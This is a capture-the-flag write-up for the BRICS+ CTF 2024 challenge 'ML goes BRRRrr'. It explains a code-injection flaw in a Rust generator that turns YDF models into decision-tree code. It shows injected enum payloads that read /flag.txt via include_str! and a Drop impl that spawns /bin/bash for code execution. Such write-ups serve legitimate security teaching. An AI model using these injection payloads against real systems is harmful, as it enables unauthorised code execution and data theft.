# BRICS+ CTF 2024 | ML goes BRRRrr

## Description

> I'm really into the ML, but I find it very slow.
>
> But what if we can make it **blazingly fast** ?
> 
> Checkout this new project I've created! It allows you to generate blazingly fast code for your [YDF](https://ydf.readthedocs.io/en/stable/) model!
> 

## Public archive

- [public/mlgoesbrr.tar.gz](public/mlgoessbrr.tar.gz)

## Deploy

```
cd deploy && docker compose up --build -d
```

## Solution

Tasks exposes a runner that allows you to upload a ZIP-archive with the [YDF](https://ydf.readthedocs.io/en/stable/) serialized model. After that runner will run a rust program that will generate rust code (decision tree) from the given model.
So basically you can control the code that will be generated. There is a /flag.txt file you need to leak.

However, it's not that easy, Rust `quote!` macro is pretty secure and won't allow you to inject arbitrary code, so we need to find how to do it.
Decision tree supports 3 types of input variables:
Numeric (f32).
Boolean (bool)
Categorical (enum)

For Categorical variables codegen will generate the Rust Enum type.
There is a “poorly done” part of the Enum code gen:
let option_str = format!("#[serde(rename = \"{}\")]", it.1);
        let option_stream: proc_macro2::TokenStream = option_str.parse().unwrap();

This part basically allows injection because it converts the formatted string to the TokenStream and quote! macro doesn’t sanitize it.

So, having this in mind we basically can inject into the enum definition:
```
enum A {
  #[serde(rename = "<we_can_control_it>")]
  Option 1 = 1,
}
```

The challenging part is that we can’t close the enum definition to get the RCE.
If we try, we will get an error like: ```error: unexpected closing delimiter: }```.
This is happening because Rust tries to compile the “ #[serde(rename = "<we_can_control_it>")]” part and doesn’t know about the previous tokens, so it can’t find the opening bracket.

So, how can we leak the flag only controlling the enum definition ?

### Solution 1 — Leak.
This solution uses the fact that we generate the decision tree.
Generated enum is unit-only enum, so all the values are integers (isize). That we can do is to inject a new option that will have the first/second/last char of the flag as an enum variant.

Basically, we can create a categorical variable named `cat` with the option named `num_chars`  and the payload like ```)]\nOption2 = include_str!("/flag.txt").len() as isize, #[serde(rename = "some_kek```.

This will allow us to get the flag length in our deserialized input if we send a payload like `{“cat”: “num_chars”}`. The only missing step is to generate the conditions for the tree that will leak us this variable. What we can do is to generate something like 
```if cat == 0 {
   return 0;
} else {
  if cat == 1 {
    return 1.
  }
}
...
```

This gives us the power to leak any part of the flag (and flag length) by simply sending the right enum option as a value.

Full Solution: [solve_leak.py](solution/solve_leak.py)




### Solution 2 — RCE.
Rust is pretty awesome and a lot of things in Rust are expressions. Having this in mind we can actually write any code in the value definition like:
```
Enum Test {
A = {
        1 + 2
    }
}
```

However in this context code should be constant evaluated, so we can’t simply do something like 
```
Enum Test {
A = {
       std::process::Command::new("/bin/bash").arg("-c").arg("cat %s").spawn().unwrap();
        1 + 2
    }
}
```

But we still can define our functions if we don’t call them. So basically we need to define some function that will be magically called after. The idea might be to implement some trait, so the function will be called for a given type. 
One of the solutions can be to impl the Drop trait for the input type, that will be created and deleted during the program execution.

```
A = {
        impl Drop for TreeInput {
            fn drop(&mut self) {
                std::process::Command::new("/bin/bash").arg("-c").arg("cat %s").spawn().unwrap();
            }
        }
        2
    }
```




Full Solution: [solve_rce.py](solution/solve_rce.py)


## Flag

```
brics+{example}
```